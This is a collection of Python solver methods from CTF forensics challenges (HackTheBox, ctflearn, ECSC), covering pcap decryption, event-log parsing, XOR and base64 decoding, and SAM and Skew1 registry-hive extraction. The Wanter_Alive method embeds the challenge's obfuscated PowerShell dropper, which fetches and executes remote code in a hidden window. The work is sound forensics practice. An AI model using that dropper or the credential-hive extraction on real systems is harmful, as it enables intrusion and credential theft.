5\xd3\x14O\xe0\x12\x06]&#34;\xb2\xa8\x82\xac`\&#39;L\x98\xbd\xbcb;\xad\x13T\x95\x15o\x1a!\x89\xc3\xadN|z\x9bv\xf9\x98\x14\xca\xff\xe2\xeeH\xa7\n\x12\x11\xa5N\xe0\x00&#39;

        # /home/figaro/CTF/Categories/Forensics/HTB/ToolPie/payloads/more_functions.py
    def demarshalling(self):
        &#34;&#34;&#34;
        Description:
            This function is used to demarshall the compressed data and display the disassembled code.
            Challenge specific function
        &#34;&#34;&#34;
        self.load_compressed_data()
        data = bz2.decompress(self.compressed_data)
        code = marshal.loads(data)

        print(dis.dis(code))

        # /home/figaro/CTF/Categories/Forensics/HTB/ToolPie/payloads/more_functions.py
    def dec_file_mes(self, mes, key):
        cypher = AES.new(key.encode(), AES.MODE_CBC, key.encode())

        return unpad(cypher.decrypt(mes), 16)

        # /home/figaro/CTF/Categories/Forensics/HTB/ToolPie/payloads/more_functions.py
    def decrypting_packet(self):
        &#34;&#34;&#34;
        Description:
            Challenge specific function
        &#34;&#34;&#34;
        # packet_data_path = self.folfil(&#34;data&#34;, &#34;packet_1.data&#34;)

        ending_number = 79

        for num in range(78, ending_number + 1):
            packet_data_path = self.folfil(&#34;data&#34;, f&#34;packet_{num}.data&#34;)

            with open(packet_data_path, &#34;rb&#34;) as f:
                packet_data = f.read()

            decrypted_data = self.dec_file_mes(packet_data, self.encryption_key)
            print(f&#34;Packet {num} :&#34;)
            print(decrypted_data)

        # /home/figaro/CTF/Categories/Forensics/HTB/ToolPie/payloads/more_functions.py
    def unified_extract_packets(self, pcap_file, pcap_function: str, raw: bool = False):
        &#34;&#34;&#34;
        Description:
            Extracts the packets from the pcap file and saves them as a numbered dictionary.
            Can use either scapy or pyshark to extract the packets.

        Args:
            pcap_file (str): Path to the pcap file.
            pcap_function (str): Function to use to extract the packets.[scapy, pyshark]

        Returns:
            dict: Dictionary of packets
        &#34;&#34;&#34;

        packets = None
        # Dictionary to hold packets
        packets_dict = {}

        if pcap_function == &#34;scapy&#34;:
            packets = rdpcap(pcap_file.as_posix())
        elif pcap_function == &#34;pyshark&#34;:
            packets = pyshark.FileCapture(pcap_file.as_posix())

        if raw:
            return packets

        for i, packet in enumerate(packets):
            packets_dict[i + 1] = packet

        return packets_dict

        # /home/figaro/CTF/Categories/Forensics/HTB/ToolPie/payloads/more_functions.py
    def smart_extract_packets(
        self,
        pcap_file,
        pcap_function: str,
        raw: bool = False,
        save: bool = False,
        filename_save: str = &#34;packets.pickle&#34;,
        folder_save: str = &#34;data&#34;,
    ):
        &#34;&#34;&#34;
        Description:
            Extracts the packets from the pcap file and saves them as a dictionary.
            If the file already exists, it loads the file.

        Args:
            pcap_file (str): Path to the pcap file.
            pcap_function (str): Function to use to extract the packets.[scapy, pyshark]
            raw (bool, optional): Option to return the raw packets. Defaults to False.
            save (bool, optional): Option to load saved file . Defaults to False.
            filename_save (str, optional): Filename to save the packets if enabled. Defaults to &#34;packets.pickle&#34;.
            folder_save (str, optional): Folder to save the filename if save is enabled. Defaults to &#34;data&#34;.
        &#34;&#34;&#34;

        file_path = None

        if save:
            file_path = self.folfil(folder_save, filename_save)

        if file_path is None or file_path.exists() is False:
            # Read the pcap file

            packets = self.unified_extract_packets(pcap_file, pcap_function, raw=raw)

            # Save the packets
            if save:
                self.pickle_save_data(
                    packets, filename=filename_save, folder=folder_save
                )
        else:
            packets = self.pickle_load_data(file_path)
        return packets

        # /home/figaro/CTF/Categories/Forensics/HTB/ToolPie/payloads/more_functions.py
    def custom_stream_extract(self, packets, stream_num=None):
        &#34;&#34;&#34;
        Description:
            Extracts the packets from the pcap file and saves them as a numbered dictionary.
            Can use either scapy or pyshark to extract the packets.

        Args:
            packets (dict): Dictionary of packets
            stream_num (int): Stream number to extract

        Returns:
            dict: Dictionary of packets
        &#34;&#34;&#34;

        packets_scapy = self.smart_extract_packets(
            self.challenge_file,
            pcap_function=&#34;scapy&#34;,
            save=True,
            filename_save=&#34;packets_scapy.pickle&#34;,
        )

        packets_pyshark = self.smart_extract_packets(
            self.challenge_file,
            pcap_function=&#34;pyshark&#34;,
            save=True,
            filename_save=&#34;packets_pyshark.pickle&#34;,
        )

        packet_dict = {}
        for i, packet in packets_pyshark.items():
            if packet.tcp.stream == stream_num:
                packet_dict[i] = packets_scapy[i]
        return packet_dict

        # /home/figaro/CTF/Categories/Forensics/HTB/ToolPie/payloads/more_functions.py
    def pyshark_extrac_tcp_stream_numbers(self, pcap_file):
        &#34;&#34;&#34;
        Description:
            Extracts the tcp stream numbers from the pcap

        Args:
            pcap_file (str): Path to the pcap file.

        Returns:
            dict: Dictionary of session indexes
        &#34;&#34;&#34;
        # To save the stream indexes
        sess_index = {}
        cap = self.smart_extract_packets(
            pcap_file,
            pcap_function=&#34;pyshark&#34;,
            save=True,
            filename_save=&#34;packets_pyshark.pickle&#34;,
        )

        for i, pkt in enumerate(cap):
            if hasattr(pkt.tcp, &#34;stream&#34;):
                sess_index[i + 1] = pkt.tcp.stream
        return sess_index

        # /home/figaro/CTF/Categories/Forensics/HTB/ToolPie/payloads/more_functions.py
    def pyshark_extract_tcp_streams(self, pcap_file, stream_num):
        # To save the stream indexes
        packet_dict = {}
        cap = self.smart_extract_packets(
            pcap_file,
            pcap_function=&#34;pyshark&#34;,
            save=True,
            filename_save=&#34;packets_pyshark.pickle&#34;,
        )

        for i, pkt in enumerate(cap):
            if hasattr(pkt.tcp, &#34;stream&#34;) and int(pkt.tcp.stream) == stream_num:
                packet_dict[i + 1] = pkt
        return packet_dict

        # /home/figaro/CTF/Categories/Forensics/HTB/ToolPie/payloads/more_functions.py
    def testin_streams(self):
        # session_index = self.pyshark_extrac_tcp_stream_numbers(self.challenge_file)
        print(&#34;Extracting tcp stream&#34;)
        packets = self.pyshark_extract_tcp_streams(self.challenge_file, 4)
        print(&#34;Extracted Streams&#34;)
        # self.pickle_save_data(packets, &#34;packets_stream_4.pickle&#34;)

        packet_keys = packets.keys()
        packet_keys = sorted(packet_keys)

        # print(&#34;Packet keys:&#34;, packet_keys)

        for i in range(packet_keys[0], packet_keys[0] + 7):
            print(f&#34;Packet {i}:&#34;)
            print(packets[i].tcp.payload)

        # /home/figaro/CTF/Categories/Forensics/HTB/ToolPie/payloads/more_functions.py
    def get_scapy_tcp_stream(self, nunber: int):
        packets = self.smart_extract_packets(
            self.challenge_file,
            pcap_function=&#34;scapy&#34;,
            raw=True,
            save=True,
            filename_save=&#34;packets_scapy_raw.pickle&#34;,
        )
        stream = packets.sessions()
        return stream

        # /home/figaro/CTF/Categories/Forensics/HTB/ToolPie/payloads/more_functions.py
    def custom_packet_997_attempt(self):
        stream_4 = self.custom_stream_extract(stream_num=4)
        decrypted_data = self.dec_file_mes(stream_4[997].load, self.encryption_key)
        # print(decrypted_data)
        md5_hash = hashlib.md5(decrypted_data).hexdigest()
        print(&#34;MD5 Hash of the byte string:&#34;, md5_hash)

        # /home/figaro/CTF/Categories/Forensics/HTB/ToolPie/payloads/more_functions.py
    def main(self):
        # self.demarshalling()
        # self.testin_streams()
        # self.save_encryption_key(self.key, self.folfil(&#34;data&#34;, &#34;key.pem&#34;))
        # packets = self.pickle_load_data(&#34;packets_dict.pickle&#34;)
        # packets_stream = self.pickle_load_data(&#34;packets_stream_4.pickle&#34;)
        # print(packets[76].load)
        # print(packets_stream[76])
        print(self.get_scapy_tcp_stream(4))

        # /home/figaro/CTF/Categories/Forensics/HTB/Wanter_Alive/payloads/solution.py
    def deobfuscation(self):

        latifoliado = &#34;U2V0LUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLVNjb3BlIFByb2Nlc3MgLUZvcmNlOyBbU3lzdGVtLk5ldC5TZd2FudGVkCgXJ2aWNlUG9pbnRNYW5hZ2VyXTo6U2VydmVyQ2VydGlmaWNhdGVWYWxpZGF0aW9uQ2FsbGJhY2sgPSB7JHRydWV9O1td2FudGVkCgTe&#34;

        latifoliado = (
            latifoliado
            + &#34;XN0ZW0uTmV0LlNlcnZpY2VQb2ludE1hbmFnZXJdOjpTZWN1cml0eVByb3RvY29sID0gW1N5c3RlbS5OZXQuU2Vydmld2FudGVkCgjZVBvaW50TWFuYWdlcl06OlNlY3VyaXR5UHJvdG9jb2wgLWJvciAzMDcyOyBpZXggKFtTeXN0ZW0uVGV4dC5FbmNvZd2FudGVkCgGl&#34;
        )
        latifoliado = (
            latifoliado
            + &#34;uZ106OlVURjguR2V0U3RyaW5nKFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoKG5ldy1vYmplY3Qgcd2FudGVkCg3lzdGVtLm5ldC53ZWJjbGllbnQpLmRvd25sb2Fkc3RyaW5nKCdodHRwOi8vd2FudGVkLmFsaXZlLmh0Yi9jZGJhL19d2FudGVkCgyc&#34;
        )
        latifoliado = latifoliado + &#34;CcpKSkpd2FudGVkCgd2FudGVkCg&#34;

        parrana = &#34;d2FudGVkCg&#34;

        arran = &#34; d2FudGVkCg d2FudGVkCg &#34;
        arran = arran + &#34;$d2FudGVkCgCod2FudGVkCgd&#34;
        arran = arran + &#34;id2FudGVkCggod2FudGVkCg &#34;
        arran = arran + &#34;d2FudGVkCg&#34; + latifoliado + &#34;d2FudGVkCg&#34;
        arran = arran + &#34;$d2FudGVkCgOWd2FudGVkCgj&#34;
        arran = arran + &#34;ud2FudGVkCgxdd2FudGVkCg &#34;
        arran = arran + &#34;=d2FudGVkCg [d2FudGVkCgs&#34;
        arran = arran + &#34;yd2FudGVkCgstd2FudGVkCge&#34;
        arran = arran + &#34;md2FudGVkCg.Td2FudGVkCge&#34;
        arran = arran + &#34;xd2FudGVkCgt.d2FudGVkCge&#34;
        arran = arran + &#34;nd2FudGVkCgcod2FudGVkCgd&#34;
        arran = arran + &#34;id2FudGVkCgngd2FudGVkCg]&#34;
        arran = arran + &#34;:d2FudGVkCg:Ud2FudGVkCgT&#34;
        arran = arran + &#34;Fd2FudGVkCg8.d2FudGVkCgG&#34;
        arran = arran + &#34;ed2FudGVkCgtSd2FudGVkCgt&#34;
        arran = arran + &#34;rd2FudGVkCgind2FudGVkCgg&#34;
        arran = arran + &#34;(d2FudGVkCg[sd2FudGVkCgy&#34;
        arran = arran + &#34;sd2FudGVkCgted2FudGVkCgm&#34;
        arran = arran + &#34;.d2FudGVkCgCod2FudGVkCgn&#34;
        arran = arran + &#34;vd2FudGVkCgerd2FudGVkCgt&#34;
        arran = arran + &#34;]d2FudGVkCg::d2FudGVkCgF&#34;
        arran = arran + &#34;rd2FudGVkCgomd2FudGVkCgb&#34;
        arran = arran + &#34;ad2FudGVkCgsed2FudGVkCg6&#34;
        arran = arran + &#34;4d2FudGVkCgStd2FudGVkCgr&#34;
        arran = arran + &#34;id2FudGVkCgngd2FudGVkCg(&#34;
        arran = arran + &#34;$d2FudGVkCgcod2FudGVkCgd&#34;
        arran = arran + &#34;id2FudGVkCggod2FudGVkCg)&#34;
        arran = arran + &#34;)d2FudGVkCg;pd2FudGVkCgo&#34;
        arran = arran + &#34;wd2FudGVkCgerd2FudGVkCgs&#34;
        arran = arran + &#34;hd2FudGVkCgeld2FudGVkCgl&#34;
        arran = arran + &#34;.d2FudGVkCgexd2FudGVkCge&#34;
        arran = arran + &#34; d2FudGVkCg-wd2FudGVkCgi&#34;
        arran = arran + &#34;nd2FudGVkCgdod2FudGVkCgw&#34;
        arran = arran + &#34;sd2FudGVkCgtyd2FudGVkCgl&#34;
        arran = arran + &#34;ed2FudGVkCg hd2FudGVkCgi&#34;
        arran = arran + &#34;dd2FudGVkCgded2FudGVkCgn&#34;
        arran = arran + &#34; d2FudGVkCg-ed2FudGVkCgx&#34;
        arran = arran + &#34;ed2FudGVkCgcud2FudGVkCgt&#34;
        arran = arran + &#34;id2FudGVkCgond2FudGVkCgp&#34;
        arran = arran + &#34;od2FudGVkCglid2FudGVkCgc&#34;
        arran = arran + &#34;yd2FudGVkCg bd2FudGVkCgy&#34;
        arran = arran + &#34;pd2FudGVkCgasd2FudGVkCgs&#34;
        arran = arran + &#34; d2FudGVkCg-Nd2FudGVkCgo&#34;
        arran = arran + &#34;Pd2FudGVkCgrod2FudGVkCgf&#34;
        arran = arran + &#34;id2FudGVkCgled2FudGVkCg &#34;
        arran = arran + &#34;-d2FudGVkCgcod2FudGVkCgm&#34;
        arran = arran + &#34;md2FudGVkCgand2FudGVkCgd&#34;
        arran = arran + &#34; d2FudGVkCg$Od2FudGVkCgW&#34;
        arran = arran + &#34;jd2FudGVkCguxd2FudGVkCgD&#34;

        return arran

        # /home/figaro/CTF/Categories/Forensics/HTB/Wanter_Alive/payloads/solution.py
    def main(self):

        text = self.deobfuscation()
        text = text.split(&#34; &#34;)

        for i in text:
            print(self.decode_base64(i.strip()))

        # /home/figaro/CTF/Categories/Forensics/HTB/Game_Invitation/payloads/solution.py
    def xor_function_dec(self, given_string, length):
        xor_key = 45
        result = bytearray()
        for i in range(length):
            result.append(given_string[i] ^ xor_key)
            xor_key = (xor_key ^ 99) ^ (i % 254)
        return bytes(result)

        # /home/figaro/CTF/Categories/Forensics/HTB/Game_Invitation/payloads/solution.py
    def regexp(self, file_content):
        pattern = b&#34;sWcDWp36x5oIe2hJGnRy1iC92AcdQgO8RLioVZWlhCKJXHRSqO450AiqLZyLFeXYilCtorg0p3RdaoPa&#34;
        index = file_content.find(pattern)
        index = index + len(pattern)
        return index

        # /home/figaro/CTF/Categories/Forensics/HTB/Game_Invitation/payloads/solution.py
    def main(self):
        file_content = open(self.challenge_file, &#34;rb&#34;).read()
        index = self.regexp(file_content)
        payload = file_content[index : index + 13082]
        payload = self.xor_function_dec(payload, len(payload))
        print(payload)

        # /home/figaro/CTF/Categories/Forensics/HTB/Ghostly_Persistence/payloads/solution.py
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.folder_logs = self.Path(self.folder_files, &#34;Logs&#34;)
        self.folder_xml = self.Path(self.folder_data, &#34;xml&#34;)

        # /home/figaro/CTF/Categories/Forensics/HTB/Ghostly_Persistence/payloads/solution.py
    def evtx_open(self, file, func, *args, **kwargs):
        with evtx.Evtx(file) as log_file:
            func(log_file, file, *args, **kwargs)

        # /home/figaro/CTF/Categories/Forensics/HTB/Ghostly_Persistence/payloads/solution.py
    def searching_records(self, log_file, func, *args, **kwargs):
        for record in log_file.records():
            func(record, *args, **kwargs)

        # /home/figaro/CTF/Categories/Forensics/HTB/Ghostly_Persistence/payloads/solution.py
    def saving_xml(self, log_file, file, display=False):
        xml_file = self.Path(self.folder_xml, f&#34;{file.name}.xml&#34;)
        if display:
            print(&#34;-&#34; * 50)
            print(f&#34;File: {file}&#34;)
            print(&#34;-&#34; * 50)

        with open(xml_file, &#34;w&#34;) as f:
            for record in log_file.records():
                record_xml = record.xml()
                if display:
                    print(record_xml)
                f.write(record_xml)

        # /home/figaro/CTF/Categories/Forensics/HTB/Ghostly_Persistence/payloads/solution.py
    def local_evtx_analysis(self, file):
        with evtx.Evtx(file) as log_file:
            self.saving_xml(log_file, file, display=False)

        # /home/figaro/CTF/Categories/Forensics/HTB/Ghostly_Persistence/payloads/solution.py
    def local_searching_file(self, file, *args, **kwargs):
        return self.search_for_base64(file, *args, **kwargs)

        # /home/figaro/CTF/Categories/Forensics/HTB/Ghostly_Persistence/payloads/solution.py
    def sorting_results(self, results):
        results = list(set(results))
        results = sorted(results, key=lambda x: len(x), reverse=True)
        return results

        # /home/figaro/CTF/Categories/Forensics/HTB/Ghostly_Persistence/payloads/solution.py
    def main(self):

        # Converting evtx files to xml
        # self.exec_on_files(self.folder_logs, self.local_evtx_analysis)

        # Searching for base64 strings in xml files
        base64_strings = self.exec_on_folder(
            folder=self.folder_xml,
            func=self.local_searching_file,
            display=False,
            save=True,
            strict=True,
        )

        base64_strings = self.sorting_results(base64_strings)
        print(base64_strings[0])
        flag = self.decode_base64(base64_strings[0])
        print(flag)
        flag = self.re_match_partial_flag(flag, origin=&#34;HTB&#34;)

        second_part = base64_strings[5]
        flag = &#34;&#34;.join(flag[0]) + self.decode_base64(second_part)

        print(flag)

        # /home/figaro/CTF/Categories/Forensics/ctflearn/HailCaesar/payloads/solution.py
    def extract_strings(self, file_path, min_length=4):
        &#34;&#34;&#34;
        Description:
            Extracts printable strings from a file

        Args:
            file_path (str): The path to the file
            min_length (int): The minimum length of the string to extract

        Returns:
            list: The list of strings

        &#34;&#34;&#34;
        with open(file_path, &#34;rb&#34;) as f:
            # Read the entire file as binary
            data = f.read()

            # Use a regular expression to find sequences of printable characters
            # The regex matches sequences of characters that are printable (ASCII 32-126)
            # and have a minimum length defined by min_length
            strings = re.findall(rb&#34;[ -~]{%d,}&#34; % min_length, data)

            # Decode the byte strings to regular strings
            return [s.decode(&#34;utf-8&#34;, errors=&#34;ignore&#34;) for s in strings]

        # /home/figaro/CTF/Categories/Forensics/ctflearn/HailCaesar/payloads/solution.py
    def extract_exif(self, file_path):
        &#34;&#34;&#34;
        Description:
            Extracts EXIF data from a file

        Args:
            file_path (str): The path to the file

        Returns:
            dict: The EXIF data
        &#34;&#34;&#34;
        # with exiftool.ExifTool() as et:
        with exiftool.ExifToolHelper() as et:
            # Read the EXIF data from the file but not duplicate ones
            # metadata = et.get_metadata(
            #     file_path,
            # )

            metadata = et.get_metadata([file_path])

            # Return the EXIF data
            return metadata

        # /home/figaro/CTF/Categories/Forensics/ctflearn/HailCaesar/payloads/solution.py
    def ascii_rot(self, text, n):
        &#34;&#34;&#34;
        Description:
            Rotates the ASCII characters in a string by n positions

        Args:
            text (str): The text to rotate
            n (int): The number of positions to rotate



        &#34;&#34;&#34;
        roted_text = &#34;&#34;
        for i in text:
            ascii_str = ord(i) + n
            if ascii_str &gt; 126:
                # This is to avoid the non-printable characters
                roted_text += chr((ascii_str % 127) + 32)
            elif ascii_str &lt; 33:
                # This is to avoid the non-printable characters
                roted_text += chr(ascii_str + 33)
            else:
                roted_text += chr(ascii_str)

        return roted_text

        # /home/figaro/CTF/Categories/Forensics/ctflearn/HailCaesar/payloads/solution.py
    def brute_ascii_rot(self, text, identifier):
        &#34;&#34;&#34;
        Description:
            Brute forces the rotation of ASCII characters in a string

        Args:
            text (str): The text to rotate
            identifier (str): The string to search for in the rotated text

        Returns:
            str: The rotated text
        &#34;&#34;&#34;
        for j in range(200):
            flag = self.ascii_rot(text, j)
            if identifier in flag:
                print(j)
                return flag

        # /home/figaro/CTF/Categories/Forensics/ctflearn/HailCaesar/payloads/solution.py
    def main(self):
        # Extract strings from the file
        strings = self.extract_strings(self.challenge_file, min_length=10)

        # # Print the strings
        # for s in strings:
        #     print(s)

        # exifs = self.extract_exif(self.challenge_file)
        # Print the EXIF data

        comment = &#34;&#34;&#34;2m{y!&#34;%w2&#39;z{&amp;o2UfX~ws%!._s+{ (&amp;@Vwu{ (&amp;@_w%{v{(&amp;0.&#34;&#34;&#34;

        flag = self.brute_ascii_rot(comment, &#34;CTFlearn&#34;)
        print(flag)

        # /home/figaro/CTF/Categories/Forensics/ECSC/HexCell_Hunt/payloads/online_attempt_02.py
    def main(self):
        # flag = self.extract_skew1_bootkey_piece(self.challenge_file)
        # print(flag)
        self.solve(self.challenge_file)

        # /home/figaro/CTF/Categories/Forensics/ECSC/HexCell_Hunt/payloads/online_attempt_02.py
    def solve(self, hive_path):
        with open(hive_path, &#34;rb&#34;) as f:
            data = f.read()

        cell, class_len = find_skew1_cell(data)

        # variant 1: exact header + class-name bytes = 4 + class_len
        flag1_blob = cell.data[: REG_CELL_HDR + class_len]

        # variant 2: entire cell (may include 0-4 bytes padding)
        flag2_blob = cell.data

        print(
            &#34;\nFound Skew1 class-name cell @ 0x{:X}, length {} bytes&#34;.format(
                cell.off, cell.size
            )
        )
        print(&#34;Class-name  :&#34;, cell.data[4 : 4 + class_len].decode(&#34;utf-16le&#34;))
        print(&#34;\nSubmit either of the following (depending on challenge checker):&#34;)
        print(&#34; 1) no-padding : ECSC{{{}}}&#34;.format(flag1_blob.hex().upper()))
        print(&#34; 2) with pad   : ECSC{{{}}}&#34;.format(flag2_blob.hex().upper()))

        # /home/figaro/CTF/Categories/Forensics/ECSC/HexCell_Hunt/payloads/online_attempt_02.py
    def extract_skew1_bootkey_piece(self, hive_path: str) -&gt; str:
        with open(hive_path, &#34;rb&#34;) as f:
            data = f.read()

        # 1) locate the ASCII string Skew1
        skew_idx = data.find(b&#34;Skew1&#34;)
        if skew_idx == -1:
            raise ValueError(&#34;Could not find Skew1 key name in hive&#34;)

        # 2) step back to the beginning of its `nk` (key-node) cell
        nk_offset = data.rfind(b&#34;nk&#34;, 0, skew_idx)  # signature 0x6E 0x6B
        if nk_offset == -1:
            raise ValueError(&#34;`nk` signature not found before Skew1&#34;)

        nk_cell_start = nk_offset - 4  # size dword is 4 bytes earlier

        # 3) read the class-name offset (dword @ 0x30) and length (word @ 0x4E)
        class_offset = struct.unpack_from(&#34;&lt;I&#34;, data, nk_cell_start + 0x30)[0]
        class_length = struct.unpack_from(&#34;&lt;H&#34;, data, nk_cell_start + 0x4E)[0]

        # The class-name offset is hive-relative (relative to first HBIN, which
        # starts immediately after the 0x1000-byte REGF header).
        class_file_offset = class_offset + 0x1000

        # 4) at that position we find another registry cell  grab its whole body
        cell_size = struct.unpack_from(&#34;&lt;i&#34;, data, class_file_offset)[0]
        cell_len = abs(cell_size)  # value is stored as negative
        cell_blob = data[class_file_offset : class_file_offset + cell_len]

        # 5) build the flag
        return f&#34;ECSC{{{cell_blob.hex().upper()}}}&#34;

        # /home/figaro/CTF/Categories/Forensics/ECSC/HexCell_Hunt/payloads/solution.py
    def main(self):
        flag = self.extract_skew1_bootkey_piece(self.challenge_file)
        print(flag)

        # /home/figaro/CTF/Categories/Forensics/ECSC/HexCell_Hunt/payloads/solution.py
    def extract_skew1_bootkey_piece(self, hive_path: str) -&gt; str:
        with open(hive_path, &#34;rb&#34;) as f:
            data = f.read()

        # 1) locate the ASCII string Skew1
        skew_idx = data.find(b&#34;Skew1&#34;)
        if skew_idx == -1:
            raise ValueError(&#34;Could not find Skew1 key name in hive&#34;)

        # 2) step back to the beginning of its `nk` (key-node) cell
        nk_offset = data.rfind(b&#34;nk&#34;, 0, skew_idx)  # signature 0x6E 0x6B
        if nk_offset == -1:
            raise ValueError(&#34;`nk` signature not found before Skew1&#34;)

        nk_cell_start = nk_offset - 4  # size dword is 4 bytes earlier

        # 3) read the class-name offset (dword @ 0x30) and length (word @ 0x4E)
        class_offset = struct.unpack_from(&#34;&lt;I&#34;, data, nk_cell_start + 0x30)[0]
        class_length = struct.unpack_from(&#34;&lt;H&#34;, data, nk_cell_start + 0x4E)[0]

        # The class-name offset is hive-relative (relative to first HBIN, which
        # starts immediately after the 0x1000-byte REGF header).
        class_file_offset = class_offset + 0x1000

        # 4) at that position we find another registry cell  grab its whole body
        cell_size = struct.unpack_from(&#34;&lt;i&#34;, data, class_file_offset)[0]
        cell_len = abs(cell_size)  # value is stored as negative
        cell_blob = data[class_file_offset : class_file_offset + cell_len]

        # 5) build the flag
        return f&#34;ECSC{{{cell_blob.hex().upper()}}}&#34;

        # /home/figaro/CTF/Categories/Forensics/ECSC/HexCell_Hunt/payloads/hive_solution.py
    def get_functions(self, variable):
        &#34;&#34;&#34;
        Get all functions of a variable
        &#34;&#34;&#34;
        return [
            func
            for func in dir(variable)
            if callable(getattr(variable, func)) and not func.startswith(&#34;__&#34;)
        ]

        # /home/figaro/CTF/Categories/Forensics/ECSC/HexCell_Hunt/payloads/hive_solution.py
    def hive_solution(self):
        self.hive = RegistryHive(self.challenge_file)
        security_answers = []
        users_base = r&#34;\SAM\Domains\Account\Users&#34;
        users_key = self.hive.get_key(users_base)
        # print(hive)

        # Get all functions of the hive object
        hive_functions = self.get_functions(self.hive)

        # print(&#34;Hive Functions:&#34;, hive_functions)
        users_key_functions = self.get_functions(users_key)

        # Get the name for each user from subkey.name

        user_key = &#34;000003E9&#34;  # print(&#34;Users Key Functions:&#34;, users_key_functions)

        user_subkeys = users_key.get_subkey(user_key)
        # print(&#34;User Subkeys:&#34;, user_subkeys.get_value(&#34;&#34;))

        # value_v = user_subkeys.get_value(&#34;V&#34;)
        value_reset = user_subkeys.get_value(&#34;ResetData&#34;)
        # value_force = user_subkeys.get_value(&#34;ForcePasswordReset&#34;)

        # decoded_value_v = self._decode_v_value(value_v)
        decoded_value_reset = self._decode_v_value(value_reset)
        # decoded_value_force = self._decode_v_value(value_force)

        # print(&#34;Decoded V Value:&#34;, decoded_value_v)
        # print(&#34;Decoded Reset Value:&#34;, decoded_value_reset)
        # print(&#34;Decoded Force Value:&#34;, decoded_value_force)

        # print(decoded_value_reset)

        # Join the list into a single string and parse it as JSON
        decoded_json = json.loads(&#34;&#34;.join(decoded_value_reset))
        flag = f&#34;ECSC{{{&#39;:&#39;.join([item[&#34;answer&#34;] for item in  decoded_json[&#34;questions&#34;]])}}}&#34;
        # answers = [item[&#34;answer&#34;] for item in decoded_value_reset.get()]
        print(flag)

        # /home/figaro/CTF/Categories/Forensics/ECSC/HexCell_Hunt/payloads/hive_solution.py
    def look_all_subkeys(self):
        # Unused
        security_answers = []
        users_base = r&#34;\SAM\Domains\Account\Users&#34;
        users_key = self.hive.get_key(users_base)

        for subkey in users_key.iter_subkeys():

            # for subkey in users_key.subkeys_list:
            if subkey.name == &#34;Names&#34;:
                continue  # Skip the Names key

            try:

                print(subkey.name, subkey.values_count, list(subkey.iter_values()))
                v_value = subkey.get_value(&#34;V&#34;)
                # print(f&#34;Value for {subkey.name}: {v_value}&#34;)
                decoded = self._decode_v_value(v_value)
                if decoded:
                    security_answers.extend(decoded)
            except Exception as e:
                print(e)
                continue

        print(security_answers)
        # Only keep unique and plausible answers (e.g. non-binary junk)
        cleaned = [a for a in security_answers if a and a.isprintable()]
        cleaned = list(dict.fromkeys(cleaned))  # remove duplicates

        return
        # Format answer according to challenge
        result = f&#34;ECSC{{{&#39;:&#39;.join(cleaned[:3])}}}&#34;
        print(result)
        self.flag = result

        # /home/figaro/CTF/Categories/Forensics/ECSC/HexCell_Hunt/payloads/hive_solution.py
    def _decode_v_value(self, value_bytes):
        try:
            # Decode as UTF-16LE (standard for registry)
            text = value_bytes.decode(&#34;utf-16le&#34;, errors=&#34;ignore&#34;)
            # Extract readable strings
            candidates = re.findall(r&#34;[\x20-\x7e]{3,}&#34;, text)
            # print(candidates)
            return candidates

            def is_valid(s):
                if len(s) &gt; 30 or len(s) &lt; 3:
                    return False
                if re.fullmatch(r&#34;[0-9a-fA-F]{6,}&#34;, s):  # ignore hashes
                    return False
                if sum(c.isalpha() for c in s) &lt; 2:
                    return False
                return True

            return [c for c in candidates if is_valid(c)]

        except Exception as e:
            print(f&#34;Decoding error: {e}&#34;)
            return []

        # /home/figaro/CTF/Categories/Forensics/ECSC/HexCell_Hunt/payloads/hive_solution.py
    def main(self):
        self.hive_solution()

        # /home/figaro/CTF/Categories/Forensics/ECSC/HexCell_Hunt/payloads/attempt_01.py
    def _discover_offset(self, nk):
        &#34;&#34;&#34;
        Try every attribute name that regipy has ever used for the cell offset.
        If none work, fall back to a regex scan in the raw hive buffer.
        &#34;&#34;&#34;
        CANDIDATE_ATTRS = (
            &#34;offset&#34;,
            &#34;_offset&#34;,  # early regipy
            &#34;absolute_offset&#34;,
            &#34;_absolute_offset&#34;,
            &#34;header_offset&#34;,
            &#34;_header_offset&#34;,
            &#34;raw_data_offset&#34;,
            &#34;_raw_data_offset&#34;,
        )

        for attr in CANDIDATE_ATTRS:
            try:
                off = getattr(nk, attr)
                if isinstance(off, int):
                    return off
            except AttributeError:
                # Attribute existed as a @property but its backing field is gone
                continue

        # /home/figaro/CTF/Categories/Forensics/ECSC/HexCell_Hunt/payloads/attempt_01.py
    def get_functions(self, variable, under=False):
        &#34;&#34;&#34;
        Get all functions of a variable
        &#34;&#34;&#34;

        return [
            func
            for func in dir(variable)
            if callable(getattr(variable, func))
            and (under or not (func.startswith(&#34;__&#34;)))
        ]

        # /home/figaro/CTF/Categories/Forensics/ECSC/HexCell_Hunt/payloads/attempt_01.py
    def get_attributes(self, variable):
        &#34;&#34;&#34;
        Get all attributes of a variable
        &#34;&#34;&#34;

        return [
            attr
            for attr in dir(variable)
            if not callable(getattr(variable, attr)) and not (attr.startswith(&#34;__&#34;))
        ]

        # /home/figaro/CTF/Categories/Forensics/ECSC/HexCell_Hunt/payloads/attempt_01.py
    def skew_get_value(self):
        self.hive = RegistryHive(self.challenge_file)

        with open(self.challenge_file, &#34;rb&#34;) as f:
            self.hive_data = f.read()

        # print(self.get_functions(self.hive))
        # control_set = self.hive.get_key(r&#34;ControlSet001&#34;)
        skew1_key = self.hive.get_key(r&#34;\ControlSet001\Control\Lsa\Skew1&#34;)
        print(self.get_functions(skew1_key))
        # print(self.get_attributes(skew1_key))
        # cell_offset = self._discover_offset(skew1_key)
        # print(f&#34;Offset of Skew1 key: {cell_offset}&#34;)

        for i in skew1_key.iter_values():
            print(i.name, i.value)
            if i.name == &#34;SkewMatrix&#34;:
                return i.value

        return None

        # /home/figaro/CTF/Categories/Forensics/ECSC/HexCell_Hunt/payloads/attempt_01.py
    def attempt_for_loop_subkeys(self):
        skew1_key = self.hive.get_key(r&#34;\ControlSet001\Control\Lsa&#34;)

        for subkey in skew1_key.iter_subkeys():
            # print(f&#34;Subkey: {subkey.name}, &#34;)
            if subkey.name == &#34;Skew1&#34;:
                # print(f&#34;Found Skew1 subkey: {subkey.name}&#34;)
                # for subvalue in subkey.iter_values
                print(self.get_functions(subkey))
                # print(self.get_attributes(subkey))
                print(dir(subkey))
                # skew1_subkey = subkey._parse_subkeys()
                # print(f&#34;Skew1 Subkey: {skew1_subkey}&#34;)
                for sub_subkey in subkey.iter_subkeys():
